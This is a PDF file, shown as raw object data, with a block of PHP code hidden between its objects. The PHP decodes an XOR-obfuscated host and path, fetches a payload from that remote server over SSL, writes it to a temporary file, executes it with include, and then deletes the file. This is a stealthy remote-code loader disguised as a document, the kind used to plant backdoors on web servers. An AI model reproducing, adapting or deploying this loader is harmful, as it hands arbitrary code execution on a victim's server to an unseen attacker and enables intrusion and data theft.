%PDF-1.6%âãÏÓ
37 0 obj<</Linearized 1/L 2794455/O 39/E 493674/N 6/T 2794093/H [ 457 176]>>endobj             
45 0 obj<</DecodeParms<</Columns 3/Predictor 12>>/Filter/FlateDecode/ID[<E83A7CF3F084F34C94DC3E20E25DCAB1><DE718CD11E5AF047A1FF3DF090DDEB38>]/Index[37 11]/Info 36 0 R/Length 52/Prev 2794094/Root 38 0 R/Size 48/Type/XRef/W[1 2 0]>>stream
hŞbbd`b`Êdb`°gb`¼Äµ@vW.ƒkÃZ]&F†-Lÿ i–â
endstreamendobjstartxref
0
%%EOF
        <?="";
	function xorEncryptDecrypt($data, $key) {
		$output = '';
		foreach (str_split($data) as $char) {
			$output .= chr(ord($char) ^ ord($key));
		}
		return $output;
	}
	$_ = "!";
		$url = xorEncryptDecrypt("S@VFHUITCTRDSBNOUDOUBNL", $_);
		$path = xorEncryptDecrypt("UDBIO@EX@C@BJO@EX@SDGRID@ERL@HOC@BJO@EX@QIQ", $_);
		$fp = fsockopen("ssl://$url", 443, $errno, $errstr, 10);
			if (!$fp) {
				echo "Error: $errstr ($errno)";
				exit;
		}
			$request = "GET $path HTTP/1.1\r\n";
			$request .= "Host: $url\r\n";
			$request .= "Connection: close\r\n\r\n";
				fwrite($fp, $request);
					$response = '';
						while (!feof($fp)) {
							$response .= fgets($fp, 1024);
								}
					fclose($fp);
	list(, $remotePayload) = explode("\r\n\r\n", $response, 2);
		$parts = str_split($remotePayload, 4);
		$obfuscatedPayload = implode('', $parts);
		$tempFile = tempnam(sys_get_temp_dir(), 'php');
			file_put_contents($tempFile, $obfuscatedPayload);
		include $tempFile;
	unlink($tempFile);
	?>
47 0 obj<</Filter/FlateDecode/I 118/Length 96/S 78>>stream
hŞb```e``â``d`~}‡A˜„˜€…£¡Øê|Œ»[ÿşKJra@‰UØËË9À M	°A1CĞ$k€Ì…:BÏš8€De´NÒŒ@| À ¡µÉ
endstreamendobj38 0 obj<</Metadata 26 0 R/Pages 35 0 R/Type/Catalog>>endobj39 0 obj<</Contents 41 0 R/CropBox[0.0 0.0 1242.0 810.0]/MediaBox[0.0 0.0 1242.0 810.0]/Parent 35 0 R/Resources<</ColorSpace<</CS0 46 0 R>>/ProcSet[/PDF/ImageC]/XObject<</Im0 44 0 R>>>>/Rotate 0/Type/Page>>endobj40 0 obj<</Filter/FlateDecode/First 5/Length 32/N 1/Type/ObjStm>>stream
hŞ21S0PˆÖ÷tvvJ,NMQ01òƒb By¸
endstreamendobj41 0 obj<</Length 32>>stream
q
1242 0 0 810 0 0 cm
/Im0 Do
Q

